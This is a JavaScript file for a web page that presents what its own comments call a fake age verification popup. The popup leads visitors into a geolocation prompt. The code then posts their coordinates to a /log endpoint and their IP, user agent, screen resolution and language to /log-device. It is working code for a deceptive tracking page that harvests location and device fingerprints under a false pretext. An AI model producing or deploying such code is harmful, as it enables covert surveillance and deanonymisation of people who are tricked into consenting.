// Function to show the fake age verification popup
function showFakeAgeVerify() {
    const agePopup = document.getElementById('age-popup');
    if (agePopup) {
        agePopup.style.display = 'block';
    }
}

// Function to hide the age popup and show the geo-location popup
function fakeAgeVerified() {
    const agePopup = document.getElementById('age-popup');
    const geoPopup = document.getElementById('geo-popup');
    
    if (agePopup) agePopup.style.display = 'none';
    if (geoPopup) geoPopup.style.display = 'block';
}

// Function to get geolocation and send it to the backend server
function allowGeo() {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
            position => {
                const lat = position.coords.latitude;
                const lon = position.coords.longitude;

                // Send coordinates securely to backend server
                fetch('/log', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ lat, lon })
                }).catch(err => console.error('Error logging location:', err));
            }, 
            error => console.error('Error getting location:', error)
        );
    }

    // Hide geo popup after allowing it
    const geoPopup = document.getElementById('geo-popup');
    if (geoPopup) {
        geoPopup.style.display = 'none';
    }
}

// Function to get IP and device fingerprinting details
function getIP(json) {
    const ip = json ? json.ip : "Unknown";
    const userAgent = navigator.userAgent;
    const resolution = `${screen.width}x${screen.height}`;
    const language = navigator.language;
    const macAddress = "Not Supported in Modern Browsers";

    const fingerprintDataWithIP = {
        ip,
        userAgent,
        macAddress,
        resolution,
        language,
    };

    // Send all data securely to backend server
    fetch('/log-device', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(fingerprintDataWithIP),
    }).catch(err => console.error('Error logging device:', err));
}
